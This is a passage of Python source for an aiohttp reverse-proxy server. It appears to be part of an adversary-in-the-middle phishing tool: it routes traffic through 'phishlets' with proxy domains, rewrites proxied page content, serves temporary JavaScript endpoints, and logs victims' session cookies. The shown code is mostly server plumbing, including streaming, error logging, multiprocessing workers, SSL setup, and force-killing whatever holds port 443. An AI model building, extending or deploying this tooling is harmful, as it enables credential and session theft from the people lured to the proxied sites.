                                    debug_log(f"Applied {len(filter_replacements)} filter replacements after content replacements", "DEBUG")
                        if is_static_file and chunk_count == 1:
                            debug_log(f"⏭️  CONTENT REPLACEMENT SKIPPED for static file: {url_path}", "DEBUG")
                            debug_log(f"   This is expected behavior for static files", "DEBUG")

                        if overlap > 0 and len(combined) > overlap:
                            out_text = combined[:-overlap]
                            tail_text = combined[-overlap:]
                        else:
                            out_text = combined
                            tail_text = ""

                        if out_text:
                            try:
                                await stream_response.write(out_text.encode('utf-8'))
                            except Exception as write_error:
                                if "Cannot write to closing transport" in str(write_error):
                                    debug_log("Client disconnected during write", "WARN")
                                    break
                                else:
                                    raise write_error

                    # Flush tail at end (only if client is still connected)
                    if tail_text and request.transport and not request.transport.is_closing():
                        try:
                            await stream_response.write(tail_text.encode('utf-8'))
                            debug_log(f"Flushed tail text: {len(tail_text)} chars", "DEBUG")
                        except Exception as write_error:
                            if "Cannot write to closing transport" in str(write_error):
                                debug_log("Client disconnected during tail flush", "WARN")
                            else:
                                raise write_error
                    
                    # Only write EOF if client is still connected
                    if request.transport and not request.transport.is_closing():
                        try:
                            await stream_response.write_eof()
                            debug_log(f"Response streaming complete: {chunk_count} chunks, {total_bytes} bytes", "INFO")
                            
                            # Debug: Log static file completion stats
                            if is_static_file:
                                debug_log(f"✅ STATIC FILE COMPLETED: {url_path}", "INFO")
                                if total_bytes > 0:
                                    size_kb = total_bytes / 1024
                            
                        except Exception as write_error:
                            if "Cannot write to closing transport" in str(write_error):
                                debug_log("Client disconnected during EOF write", "WARN")
                            else:
                                raise write_error
                    else:
                        debug_log("Client disconnected before EOF write", "WARN")
                    
                    return stream_response
                    
                except Exception as chunk_error:
                    debug_log(f"Chunk processing error: {chunk_error}", "ERROR")
                    debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
                    
                    # Debug: Log if this was a static file request
                    if is_static_file:
                        debug_log(f"❌ STATIC FILE ERROR: {url_path}", "ERROR")
                        debug_log(f"   Error occurred during streaming", "ERROR")
                    
                    # Check if it's a connection reset error
                    if "Cannot write to closing transport" in str(chunk_error):
                        debug_log("Client disconnected - returning early", "WARN")
                        return web.Response(status=499)  # Client Closed Request
                    
                    # Try to prepare response if not already prepared
                    if not stream_response.prepared and request.transport and not request.transport.is_closing():
                        try:
                            await stream_response.prepare(request)
                        except Exception as prepare_error:
                            if "Cannot write to closing transport" in str(prepare_error):
                                debug_log("Client disconnected during response preparation", "WARN")
                                return web.Response(status=499)
                            else:
                                raise prepare_error
                    
                    # Only write EOF if client is still connected
                    if request.transport and not request.transport.is_closing():
                        try:
                            await stream_response.write_eof()
                        except Exception as eof_error:
                            if "Cannot write to closing transport" in str(eof_error):
                                debug_log("Client disconnected during EOF write", "WARN")
                            else:
                                debug_log(f"EOF write error: {eof_error}", "ERROR")
                    
                    debug_log("-------🥖🥖🥖🥖🥖 responce end 🥖🥖🥖🥖🥖-----------", "INFO")
                    return stream_response

    except Exception as e:
        debug_log("----------🥖🥖🥖🥖🥖 request end 🥖🥖🥖🥖🥖------------", "INFO")
        debug_log("🚨🚨🚨🚨🚨 PROXY ERROR DEBUG INFO 🚨🚨🚨🚨🚨", "ERROR")
        debug_log("=" * 80, "ERROR")
        
        # Enhanced error information
        debug_log(f"❌ ERROR TYPE: {type(e).__name__}", "ERROR")
        debug_log(f"❌ ERROR MESSAGE: {str(e)}", "ERROR")
        debug_log(f"❌ ERROR MODULE: {e.__class__.__module__}", "ERROR")
        
        # Request context information
        debug_log("📋 REQUEST CONTEXT AT ERROR:", "ERROR")
        debug_log(f"   Method: {request.method if 'request' in locals() else 'N/A'}", "ERROR")
        debug_log(f"   URL: {str(request.url) if 'request' in locals() else 'N/A'}", "ERROR")
        debug_log(f"   Incoming Host: {incoming_host if 'incoming_host' in locals() else 'N/A'}", "ERROR")
        debug_log(f"   Target Host: {target_host if 'target_host' in locals() else 'N/A'}", "ERROR")
        debug_log(f"   Target URL: {target_url if 'target_url' in locals() else 'N/A'}", "ERROR")
        
        # Phishlet information
        if 'matching_phishlet' in locals() and matching_phishlet:
            debug_log(f"   Phishlet: {matching_phishlet.get('name', 'N/A')}", "ERROR")
            debug_log(f"   Proxy Domain: {matching_phishlet.get('proxy_domain', 'N/A')}", "ERROR")
        else:
            debug_log(f"   Phishlet: None", "ERROR")
        
        # Proxy configuration
        if 'proxy_config' in locals() and proxy_config:
            debug_log(f"   Proxy Type: {proxy_config.get('type', 'N/A')}", "ERROR")
            debug_log(f"   Proxy URL: {proxy_config.get('url', 'N/A')}", "ERROR")
        else:
            debug_log(f"   Proxy Config: None", "ERROR")
        
        # Session information
        if 'session_cookie' in locals():
            debug_log(f"   Session Cookie: {session_cookie[:20] + '...' if len(session_cookie) > 20 else session_cookie}", "ERROR")
        else:
            debug_log(f"   Session Cookie: N/A", "ERROR")
        
        # Static file information
        if 'is_static_file' in locals() and is_static_file:
            debug_log(f"❌ STATIC FILE PROXY ERROR: {url_path if 'url_path' in locals() else 'Unknown'}", "ERROR")
            debug_log(f"   Error occurred during static file handling", "ERROR")
            debug_log(f"   File Extension: {url_path.split('.')[-1] if 'url_path' in locals() and '.' in url_path else 'N/A'}", "ERROR")
        
        # Timing information
        if 'request_start_time' in locals():
            import time
            error_time = time.time()
            duration = error_time - request_start_time
            debug_log(f"⏱️  ERROR TIMING:", "ERROR")
            debug_log(f"   Request Duration: {duration:.3f} seconds", "ERROR")
            debug_log(f"   Error Time: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(error_time))}", "ERROR")
        
        # Full traceback
        debug_log("📚 FULL TRACEBACK:", "ERROR")
        debug_log(f"{traceback.format_exc()}", "ERROR")
        
        debug_log("=" * 80, "ERROR")
        debug_log("🚨🚨🚨🚨🚨 END PROXY ERROR DEBUG INFO 🚨🚨🚨🚨🚨", "ERROR")
        
        return web.Response(text=f"Proxy Error: {e}", status=500)


async def _build_ssl_context():
    # Build routing and SSL (SNI) contexts off the event loop thread to avoid
    # Django's SynchronousOnlyOperation in async contexts.
    debug_log("Building SSL context...", "INFO")
    base_ctx = await asyncio.to_thread(_refresh_routing_and_ssl)
    if base_ctx is None:
        debug_log("SSL not configured. Falling back to HTTP.", "WARN")
    else:
        debug_log("SSL context built successfully", "INFO")
    return base_ctx


async def _start_and_wait(stop_event: threading.Event, *, port: int) -> None:
    global _runner, _site, _status, _worker_processes, _worker_pool, _process_manager, _shared_status
    
    debug_log("=== STARTING PROXY SERVER ===", "INFO")
    debug_log(f"Target port: {port}", "INFO")
    
    # Check if multiprocessing is enabled
    if MULTIPROCESSING_ENABLED and MULTIPROCESSING_MODE == 'process':
        debug_log(f"Starting multiprocessing mode with {WORKER_PROCESSES} worker processes", "INFO")
        # Create a multiprocessing Event for worker processes
        mp_stop_event = multiprocessing.Event()
        # Set the multiprocessing event when the threading event is set
        def sync_events():
            while not stop_event.is_set():
                if mp_stop_event.is_set():
                    break
                time.sleep(0.1)
            if stop_event.is_set():
                mp_stop_event.set()
        
        # Start the sync thread
        sync_thread = threading.Thread(target=sync_events, daemon=True)
        sync_thread.start()
        
        await _start_multiprocessing_server(mp_stop_event, port)
        return
    
    debug_log("Starting single-threaded mode", "INFO")
    await _start_single_threaded_server(stop_event, port)

async def _start_multiprocessing_server(stop_event, port: int) -> None:
    """Start the proxy server using multiple worker processes"""
    global _worker_processes, _process_manager, _shared_status
    
    debug_log("=== STARTING MULTIPROCESSING PROXY SERVER ===", "INFO")
    
    # Setup multiprocessing environment (only if we're in the main process)
    if multiprocessing.current_process().name == 'MainProcess':
        _setup_multiprocessing()
    else:
        debug_log("Not in main process, skipping multiprocessing setup", "DEBUG")
    
    # Create process manager for shared state (only in main process)
    if multiprocessing.current_process().name == 'MainProcess':
        _process_manager = Manager()
        _shared_status = _process_manager.dict()
        _shared_status.update({"running": True, "port": port, "error": None, "scheme": None})
    else:
        debug_log("Not in main process, using existing shared state", "DEBUG")
        _shared_status = None
    
    # Start cache cleanup task in main process
    if CACHE_ENABLED and multiprocessing.current_process().name == 'MainProcess':
        debug_log("Starting cache cleanup task in main process...", "INFO")
        
        async def cache_cleanup_task():
            while not stop_event.is_set():
                try:
                    await asyncio.sleep(3600)  # Run every hour
                    if not stop_event.is_set():
                        debug_log("Running periodic cache cleanup...", "DEBUG")
                        await asyncio.to_thread(_cleanup_cache)
                except Exception as e:
                    debug_log(f"Error in cache cleanup task: {e}", "ERROR")
        
        cleanup_task = asyncio.create_task(cache_cleanup_task())
        debug_log("✅ Cache cleanup task started in main process", "INFO")
    elif CACHE_ENABLED:
        debug_log("Cache cleanup disabled in worker process", "DEBUG")
    
    # Build SSL context
    ssl_context = await _build_ssl_context()
    port_to_use = port
    
    if ssl_context is None and port_to_use < 1024:
        debug_log(f"Port {port_to_use} requires elevated privileges; using {FALLBACK_HTTP_PORT} for HTTP.", "WARN")
        port_to_use = FALLBACK_HTTP_PORT
    
    scheme = 'HTTPS' if ssl_context else 'HTTP'
    if _shared_status:
        _shared_status.update({"scheme": scheme, "port": port_to_use})
    else:
        debug_log("No shared status available, skipping update", "DEBUG")
    
    # In multiprocessing mode, we start the main server in the main process
    # and create worker processes that will handle requests
    if multiprocessing.current_process().name == 'MainProcess':
        debug_log("Starting main server process...", "INFO")
        
        # Start the main server (this will bind to the port)
        app = web.Application()
        
        # Remove Server header for security
        app.on_response_prepare.append(remove_server_header)
        
        # Add routes for the main server
        app.router.add_route('GET', '/_cache/config', cache_config_handler)
        app.router.add_route('GET', '/_cache/stats', cache_stats_handler)
        app.router.add_route('GET', '/_cache/directory', cache_directory_handler)
        app.router.add_route('POST', '/_cache/clear', cache_clear_handler)
        app.router.add_route('POST', '/_cache/cleanup', cache_cleanup_handler)
        app.router.add_route('GET', '/_multiprocessing/stats', multiprocessing_stats_handler)
        app.router.add_route('GET', '/_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}', temp_js_handler)
        app.router.add_route('OPTIONS', '/_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}', temp_js_handler)
        app.router.add_route('*', '/{path:.*}', proxy_handler)
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        try:
            site = web.TCPSite(runner, '0.0.0.0', port_to_use, ssl_context=ssl_context)
            await site.start()
            debug_log(f"✓ Main server started successfully on port {port_to_use}", "INFO")
            
            # Now create worker processes for request handling
            debug_log(f"Creating {WORKER_PROCESSES} worker processes for request handling...", "INFO")
            _worker_processes = []
            
            for i in range(WORKER_PROCESSES):
                worker = _create_worker_process(i + 1, port_to_use, ssl_context, stop_event)
                _worker_processes.append(worker)
                worker.start()
                debug_log(f"✅ Worker process {i + 1} started (PID: {worker.pid})", "INFO")
            
            debug_log(f"================================================", "INFO")
            debug_log(f"✓ {scheme} multiprocessing proxy running on 0.0.0.0:{port_to_use}", "INFO")
            debug_log(f"✓ {len(_worker_processes)} worker processes active", "INFO")
            debug_log(f"================================================", "INFO")
            
            # Wait for stop signal
            try:
                loop = asyncio.get_running_loop()
                debug_log("Waiting for stop signal...", "INFO")
                await loop.run_in_executor(None, stop_event.wait)
                debug_log("Stop signal received", "INFO")
            finally:
                await runner.cleanup()
                await _cleanup_multiprocessing_server()
                
        except Exception as e:
            debug_log(f"Error starting main server: {e}", "ERROR")
            await runner.cleanup()
            raise
    else:
        debug_log("Not in main process, skipping server startup", "DEBUG")
        _worker_processes = []

async def _cleanup_multiprocessing_server():
    """Cleanup multiprocessing server resources"""
    global _worker_processes, _process_manager, _shared_status
    
    debug_log("Cleaning up multiprocessing server...", "INFO")
    
    # Terminate all worker processes (only if we have any)
    if _worker_processes:
        debug_log(f"Terminating {len(_worker_processes)} worker processes...", "INFO")
        for i, worker in enumerate(_worker_processes):
            try:
                if worker.is_alive():
                    debug_log(f"Terminating worker {i + 1} (PID: {worker.pid})", "DEBUG")
                    worker.terminate()
                    worker.join(timeout=2.0)
                    
                    if worker.is_alive():
                        debug_log(f"Force killing worker {i + 1} (PID: {worker.pid})", "WARN")
                        worker.kill()
                        worker.join(timeout=1.0)
                    
                    debug_log(f"Worker {i + 1} terminated", "INFO")
                else:
                    debug_log(f"Worker {i + 1} already terminated", "DEBUG")
            except Exception as e:
                debug_log(f"Error terminating worker {i + 1}: {e}", "ERROR")
        
        _worker_processes.clear()
        debug_log("All worker processes terminated", "INFO")
    else:
        debug_log("No worker processes to terminate", "DEBUG")
    
    # Cleanup process manager (only in main process)
    if _process_manager and multiprocessing.current_process().name == 'MainProcess':
        try:
            _process_manager.shutdown()
            debug_log("Process manager shutdown complete", "INFO")
        except Exception as e:
            debug_log(f"Error shutting down process manager: {e}", "ERROR")
        _process_manager = None
        _shared_status = None
    else:
        debug_log("Process manager cleanup skipped (not in main process)", "DEBUG")
    
    debug_log("Multiprocessing server cleanup complete", "INFO")

async def _start_single_threaded_server(stop_event: threading.Event, port: int) -> None:
    """Start the proxy server using single-threaded mode (original implementation)"""
    global _runner, _site, _status
    
    debug_log("=== STARTING SINGLE-THREADED PROXY SERVER ===", "INFO")
    
    # Start cache cleanup task
    if CACHE_ENABLED:
        debug_log("Starting cache cleanup task...", "INFO")
        
        async def cache_cleanup_task():
            while not stop_event.is_set():
                try:
                    await asyncio.sleep(3600)  # Run every hour
                    if not stop_event.is_set():
                        debug_log("Running periodic cache cleanup...", "DEBUG")
                        await asyncio.to_thread(_cleanup_cache)
                except Exception as e:
                    debug_log(f"Error in cache cleanup task: {e}", "ERROR")
        
        # Start cache cleanup task
        cleanup_task = asyncio.create_task(cache_cleanup_task())
        debug_log("✅ Cache cleanup task started", "INFO")
    
    ssl_context = await _build_ssl_context()
    port_to_use = port
    
    if ssl_context is None and port_to_use < 1024:
        debug_log(f"Port {port_to_use} requires elevated privileges; using {FALLBACK_HTTP_PORT} for HTTP.", "WARN")
        port_to_use = FALLBACK_HTTP_PORT

    app = web.Application()
    
    # Remove Server header for security
    app.on_response_prepare.append(remove_server_header)
    
    # Add route for cache statistics and management
    app.router.add_route('GET', '/_cache/config', cache_config_handler)
    app.router.add_route('GET', '/_cache/stats', cache_stats_handler)
    app.router.add_route('GET', '/_cache/directory', cache_directory_handler)
    app.router.add_route('POST', '/_cache/clear', cache_clear_handler)
    app.router.add_route('POST', '/_cache/cleanup', cache_cleanup_handler)
    debug_log("✅ Cache management routes registered: GET,POST /_cache/*", "INFO")
    
    # Add route for multiprocessing statistics
    app.router.add_route('GET', '/_multiprocessing/stats', multiprocessing_stats_handler)
    debug_log("✅ Multiprocessing stats route registered: GET /_multiprocessing/stats", "INFO")
    
    # Add route for temporary JavaScript endpoints (MUST be before catch-all)
    # Use more specific pattern to avoid conflicts
    app.router.add_route('GET', '/_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}', temp_js_handler)
    app.router.add_route('OPTIONS', '/_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}', temp_js_handler)
    debug_log("✅ JavaScript endpoint routes registered: GET,OPTIONS /_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}", "INFO")
    
    # Add catch-all route for proxy handling (MUST be last)
    app.router.add_route('*', '/{path:.*}', proxy_handler)
    debug_log("✅ Proxy catch-all route registered: /{path:.*}", "INFO")
    
    debug_log("Web application created with proxy handler and JS endpoints", "DEBUG")

    _runner = web.AppRunner(app)
    await _runner.setup()
    debug_log("App runner setup complete", "DEBUG")

    async def _try_start_on(p: int) -> Tuple[bool, Optional[str]]:
        global _site
        try:
            debug_log(f"Attempting to start server on port {p}...", "INFO")
            _site = web.TCPSite(_runner, '0.0.0.0', p, ssl_context=ssl_context)
            await _site.start()
            debug_log(f"✓ Server started successfully on port {p}", "INFO")
            return True, None
        except OSError as e:
            debug_log(f"OS Error starting on port {p}: {e}", "ERROR")
            return False, str(e)
        except Exception as e:
            debug_log(f"Unexpected error starting on port {p}: {e}", "ERROR")
            debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
            return False, str(e)

    # First attempt
    debug_log(f"First attempt to start on port {port_to_use}", "INFO")
    ok, err = await _try_start_on(port_to_use)
    if not ok:
        debug_log(f"First attempt failed: {err}", "WARN")
        
        # If address in use, attempt to free 443 specifically (darwin/linux) and retry once
        def _is_addr_in_use(message: str) -> bool:
            lower = (message or "").lower()
            return (
                "address already in use" in lower
                or "errno 48" in lower  # macOS EADDRINUSE
                or "errno 98" in lower  # Linux EADDRINUSE
            )

        if _is_addr_in_use(err or "") and port_to_use == 443:
            debug_log("Port 443 is busy. Attempting to free it...", "INFO")
            try:
                # macOS/Linux: use lsof to find PIDs listening on 443
                res = subprocess.run([
                    "lsof", "-ti", f"tcp:{port_to_use}"
                ], capture_output=True, text=True, check=False)
                pids = [int(x) for x in res.stdout.strip().splitlines() if x.strip().isdigit()]
                if pids:
                    debug_log(f"Found PIDs listening on 443: {pids}", "INFO")
                    # Try graceful term first
                    for pid in pids:
                        try:
                            debug_log(f"Sending SIGTERM to PID {pid}", "DEBUG")
                            os.kill(pid, 15)  # SIGTERM
                        except Exception as e:
                            debug_log(f"Failed to send SIGTERM to PID {pid}: {e}", "WARN")
                    time.sleep(1.0)
                    # Check again
                    res2 = subprocess.run([
                        "lsof", "-ti", f"tcp:{port_to_use}"
                    ], capture_output=True, text=True, check=False)
                    remaining = [int(x) for x in res2.stdout.strip().splitlines() if x.strip().isdigit()]
                    if remaining:
                        debug_log(f"Some PIDs still listening: {remaining}, forcing kill", "WARN")
                        for pid in remaining:
                            try:
                                debug_log(f"Sending SIGKILL to PID {pid}", "DEBUG")
                                os.kill(pid, 9)  # SIGKILL
                            except Exception as e:
                                debug_log(f"Failed to send SIGKILL to PID {pid}: {e}", "WARN")
                        time.sleep(0.5)
                else:
                    debug_log("No PIDs found to kill on 443.", "INFO")
            except FileNotFoundError:
                debug_log("'lsof' not available. Cannot free port 443 automatically.", "WARN")
            except Exception as e:
                debug_log(f"Failed to free port 443: {e}", "ERROR")
                debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")

            # Retry once
            debug_log("Retrying after port cleanup...", "INFO")
            ok, err = await _try_start_on(port_to_use)

    if not ok:
        debug_log(f"Could not bind on {port_to_use} ({err}). Falling back to {FALLBACK_HTTP_PORT}.", "WARN")
        port_to_use = FALLBACK_HTTP_PORT
        ok, err = await _try_start_on(port_to_use)
        if not ok:
            debug_log(f"Fallback port also failed: {err}", "ERROR")
            _status.update({"running": False, "port": None, "scheme": None, "error": err})
            raise RuntimeError(f"Failed to start proxy on fallback port {FALLBACK_HTTP_PORT}: {err}")

    scheme = 'HTTPS' if ssl_context else 'HTTP'
    debug_log(f"================================================", "INFO")
    debug_log(f"✓ {scheme} proxy running on 0.0.0.0:{port_to_use}", "INFO")
    debug_log(f"================================================", "INFO")
    _status.update({"running": True, "port": port_to_use, "scheme": scheme, "error": None})

    # Wait until stop_event is set in a thread executor
    try:
        loop = asyncio.get_running_loop()
        debug_log("Waiting for stop signal...", "INFO")
        await loop.run_in_executor(None, stop_event.wait)
        debug_log("Stop signal received", "INFO")
    finally:
        try:
            debug_log("Cleaning up server...", "INFO")
            await _runner.cleanup()
            debug_log("Server cleanup complete", "INFO")
        except Exception as e:
            debug_log(f"Error during cleanup: {e}", "ERROR")
        _status.update({"running": False})
        debug_log("=== PROXY SERVER STOPPED ===", "INFO")


def start_proxy_server(port: Optional[int] = None,
                       *,
                       target_host: Optional[str] = None,
                       proxy_host: Optional[str] = None,
                       cert_file: Optional[str] = None,
                       key_file: Optional[str] = None) -> Dict[str, Any]:
    global _server_thread, _loop, _stop_event, TARGET_HOST, PROXY_HOST, PROXY_PORT, CERT_FILE, KEY_FILE, _worker_processes, _process_manager, _shared_status
    
    debug_log("=== STARTING PROXY SERVER ===", "INFO")
    debug_log(f"Requested port: {port}", "DEBUG")
    debug_log(f"Requested target_host: {target_host}", "DEBUG")
    debug_log(f"Requested proxy_host: {proxy_host}", "DEBUG")
    debug_log(f"Requested cert_file: {cert_file}", "DEBUG")
    debug_log(f"Requested key_file: {key_file}", "DEBUG")
    
    # If explicit hosts are not provided, we will rely on routing built from all active phishlets

    # Apply explicit overrides if provided
    if target_host:
        TARGET_HOST = target_host
        debug_log(f"Set TARGET_HOST to: {target_host}", "INFO")
    if proxy_host:
        PROXY_HOST = proxy_host
        debug_log(f"Set PROXY_HOST to: {proxy_host}", "INFO")
    if cert_file:
        CERT_FILE = cert_file
        debug_log(f"Set CERT_FILE to: {cert_file}", "INFO")
    if key_file:
        KEY_FILE = key_file
        debug_log(f"Set KEY_FILE to: {key_file}", "INFO")
    if port is not None:
        PROXY_PORT = int(port)
        debug_log(f"Set PROXY_PORT to: {PROXY_PORT}", "INFO")

    # Check if proxy is already running (either single-threaded or multiprocessing)
    if (_server_thread and _server_thread.is_alive()) or (_worker_processes and any(p.is_alive() for p in _worker_processes)):
        debug_log("Proxy already running, returning current status", "WARN")
        return {"ok": True, "message": "Proxy already running.", "status": get_proxy_status()}

    debug_log("Creating stop event and server thread", "DEBUG")
    _stop_event = threading.Event()
    
    # Log multiprocessing configuration
    if MULTIPROCESSING_ENABLED:
        debug_log(f"Multiprocessing enabled: {MULTIPROCESSING_MODE} mode with {WORKER_PROCESSES} workers", "INFO")
    else:
        debug_log("Multiprocessing disabled, using single-threaded mode", "INFO")

    def _thread_target():
        global _loop
        debug_log("Server thread starting...", "INFO")
        _loop = asyncio.new_event_loop()
        asyncio.set_event_loop(_loop)
        try:
            debug_log("Running server event loop", "DEBUG")
            _loop.run_until_complete(_start_and_wait(_stop_event, port=PROXY_PORT))
        except Exception as e:
            debug_log(f"Server thread error: {e}", "ERROR")
            debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
        finally:
            try:
                debug_log("Stopping server event loop", "DEBUG")
                _loop.stop()
            except Exception as e:
                debug_log(f"Error stopping loop: {e}", "WARN")
            try:
                _loop.close()
                debug_log("Server event loop closed", "DEBUG")
            except Exception as e:
                debug_log(f"Error closing loop: {e}", "WARN")
            debug_log("Server thread exiting", "INFO")

    _server_thread = threading.Thread(target=_thread_target, name='http-proxy', daemon=True)
    debug_log("Starting server thread", "INFO")
    _server_thread.start()
    
    # Wait a moment for the server to start
    time.sleep(0.1)
    status = get_proxy_status()
    debug_log(f"Server startup complete. Status: {status}", "INFO")
    
    return {"ok": True, "message": "Proxy starting.", "status": status}


def stop_proxy_server() -> Dict[str, Any]:
    global _stop_event, _server_thread, _worker_processes, _process_manager, _shared_status
    
    debug_log("=== STOPPING PROXY SERVER ===", "INFO")
    
    # Check if proxy is running (either single-threaded or multiprocessing)
    is_running = (_server_thread and _server_thread.is_alive()) or (_worker_processes and any(p.is_alive() for p in _worker_processes))
    
    if not is_running:
        debug_log("Proxy not running, nothing to stop", "WARN")
        return {"ok": True, "message": "Proxy not running.", "status": get_proxy_status()}
    
    debug_log("Setting stop event", "INFO")
    if _stop_event:
        _stop_event.set()
    
    # Stop multiprocessing workers if running (only in main process)
    if _worker_processes and any(p.is_alive() for p in _worker_processes) and multiprocessing.current_process().name == 'MainProcess':
        debug_log("Stopping multiprocessing workers...", "INFO")
        asyncio.run(_cleanup_multiprocessing_server())
    elif _worker_processes and any(p.is_alive() for p in _worker_processes):
        debug_log("Multiprocessing workers running but not in main process, skipping cleanup", "WARN")
    
    # Stop single-threaded server if running
    if _server_thread and _server_thread.is_alive():
        debug_log("Waiting for server thread to join (timeout: 3s)", "INFO")
        _server_thread.join(timeout=3.0)
        
        if _server_thread.is_alive():
            debug_log("Server thread did not stop within timeout", "WARN")
        else:
            debug_log("Server thread stopped successfully", "INFO")
    
    status = get_proxy_status()
    debug_log(f"Stop complete. Final status: {status}", "INFO")
    return {"ok": True, "message": "Proxy stopped.", "status": status}


def restart_proxy_server(port: Optional[int] = None) -> Dict[str, Any]:
    debug_log("=== RESTARTING PROXY SERVER ===", "INFO")
    debug_log(f"Requested port: {port}", "DEBUG")
    
    current_status = get_proxy_status()
    debug_log(f"Current status: {current_status}", "DEBUG")
    
    if current_status.get("running"):
        debug_log("Stopping existing server...", "INFO")
        stop_result = stop_proxy_server()
        debug_log(f"Stop result: {stop_result}", "DEBUG")
        
        # Give it a moment to fully stop
        time.sleep(0.5)
    else:
        debug_log("No running server to stop", "INFO")
    
    debug_log("Starting new server...", "INFO")
    start_result = start_proxy_server(port or PROXY_PORT)
    debug_log(f"Start result: {start_result}", "DEBUG")
    
    return start_result


def get_proxy_status() -> Dict[str, Any]:
    # Check if multiprocessing workers are running
    multiprocessing_running = bool(_worker_processes and any(p.is_alive() for p in _worker_processes))
    
    # Check if single-threaded server is running
    single_threaded_running = bool(_server_thread and _server_thread.is_alive() and _status.get("running"))
    
    # Determine which status to use
    if multiprocessing_running and _shared_status:
        return {
            "running": True,
            "port": _shared_status.get("port") or PROXY_PORT,
            "scheme": _shared_status.get("scheme") or ("HTTPS" if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE) else "HTTP"),
            "error": _shared_status.get("error"),
            "mode": "multiprocessing",
            "worker_count": len(_worker_processes) if _worker_processes else 0,
            "active_workers": sum(1 for p in _worker_processes if p.is_alive()) if _worker_processes else 0
        }
    elif single_threaded_running:
        return {
            "running": True,
            "port": _status.get("port") or PROXY_PORT,
            "scheme": _status.get("scheme") or ("HTTPS" if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE) else "HTTP"),
            "error": _status.get("error"),
            "mode": "single-threaded",
            "worker_count": 1,
            "active_workers": 1
        }
    else:
        # Check if we're in a worker process
        if multiprocessing.current_process().name != 'MainProcess':
            return {
                "running": True,
                "port": PROXY_PORT,
                "scheme": "HTTPS" if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE) else "HTTP",
                "error": None,
                "mode": "multiprocessing_worker",
                "worker_count": 1,
                "active_workers": 1
            }
        else:
            return {
                "running": False,
                "port": None,
                "scheme": None,
                "error": None,
                "mode": "stopped",
                "worker_count": 0,
                "active_workers": 0
            }

def get_multiprocessing_stats() -> Dict[str, Any]:
    """Get detailed multiprocessing statistics"""
    # Check if we're in the main process
    if multiprocessing.current_process().name != 'MainProcess':
        return {
            "error": "Not in main process",
            "process_name": multiprocessing.current_process().name,
            "multiprocessing_enabled": MULTIPROCESSING_ENABLED,
            "multiprocessing_mode": MULTIPROCESSING_MODE,
            "worker_processes": WORKER_PROCESSES,
            "cpu_count": cpu_count()
        }
    
    if not _worker_processes:
        return {"error": "No multiprocessing workers configured"}
    
    stats = {
        "total_workers": len(_worker_processes),
        "active_workers": 0,
        "worker_details": []
    }
    
    for i, worker in enumerate(_worker_processes):
        worker_info = {
            "worker_id": i + 1,
            "pid": worker.pid if hasattr(worker, 'pid') else None,
            "alive": worker.is_alive(),
            "exitcode": worker.exitcode if hasattr(worker, 'exitcode') else None
        }
        stats["worker_details"].append(worker_info)
        
        if worker.is_alive():
            stats["active_workers"] += 1
    
    # Add configuration info
    stats.update({
        "multiprocessing_enabled": MULTIPROCESSING_ENABLED,
        "multiprocessing_mode": MULTIPROCESSING_MODE,
        "worker_processes": WORKER_PROCESSES,
        "cpu_count": cpu_count()
    })
    
    return stats


async def main():
    # CLI entrypoint: start and block until Ctrl+C
    stop_evt = threading.Event()
    try:
        await _start_and_wait(stop_evt, port=PROXY_PORT)
    except KeyboardInterrupt:
        stop_evt.set()


def create_proxy_session(proxy_config: dict) -> ClientSession:
    """
    Create a ClientSession with proxy configuration.
    
    Args:
        proxy_config: Dictionary containing proxy configuration with keys:
            - type: proxy type (http, https, socks4, socks5)
            - host: proxy hostname
            - port: proxy port
            - username: proxy username (optional)
            - password: proxy password (optional)
            - url: full proxy URL
    
    Returns:
        ClientSession configured with the proxy
    """
    # Create a connector and session with increased header size limits
    # Some sites (like x.com) send very large header values that exceed aiohttp's defaults
    # max_line_size: Maximum size of status line (8KB default -> 64KB)
    # max_field_size: Maximum size of header field value (8KB default -> 64KB)
    connector = TCPConnector()
    
    # These parameters go on ClientSession, not TCPConnector
    session_kwargs = {
        'connector': connector,
        'max_line_size': 65536,  # 64KB (default is 8190 bytes)
        'max_field_size': 65536,  # 64KB (default is 8190 bytes)
    }
    
    if not proxy_config:
        return ClientSession(**session_kwargs)
    
    # For now, we'll support HTTP and HTTPS proxies
    # SOCKS support would require additional dependencies
    if proxy_config['type'] in ['http', 'https']:
        proxy_url = proxy_config['url']
        debug_log(f"Creating ClientSession with proxy: {proxy_url}", "INFO")
        
        # For aiohttp, we need to pass the proxy URL in the request method
        # The session itself doesn't have proxy configuration, it's per-request
        # So we'll create a regular session and handle proxy in the request
        return ClientSession(**session_kwargs)
    else:
        debug_log(f"Unsupported proxy type: {proxy_config['type']}, using direct connection", "WARN")
        return ClientSession(**session_kwargs)


if __name__ == '__main__':
    asyncio.run(main())



